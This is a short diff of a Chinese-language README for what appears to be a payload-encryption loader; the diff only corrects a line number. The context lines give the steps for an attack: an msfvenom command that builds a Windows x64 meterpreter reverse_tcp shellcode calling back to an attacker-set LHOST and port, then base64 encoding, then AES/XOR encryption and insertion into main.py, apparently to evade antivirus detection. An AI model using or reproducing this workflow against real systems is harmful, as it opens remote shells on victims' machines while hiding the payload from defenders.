@@ -15,7 +15,7 @@ pip install -r .\requirements.txt
 #生成shellcode<br />`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=9999 -f raw > rev.raw`
 <a name="rNUTI"></a>
 ## base64编码shellcode并替换jiami.py中的值
-#base64<br />`base64 -w 0 -i rev.raw > rev.bs64`<br />`cat rev.bs64`<br />复制base64的值替换jiami.py中payload       也就是 第二十五行 sc='payload' 
+#base64<br />`base64 -w 0 -i rev.raw > rev.bs64`<br />`cat rev.bs64`<br />复制base64的值替换jiami.py中payload       也就是 第二十四行 sc='payload' 
 <a name="uXwYU"></a>
 ## 加密base64并替换main.py中的值
 #加密base64后的shellcode<br />`python3 jiami.py`<br />#会生成一个aes-xor.txt的文件，复制文件里的值(经过XOR和AES加密后)<br />复制的值替换main.py中的payload   也就是第四十一行 jiami_sc='payload'
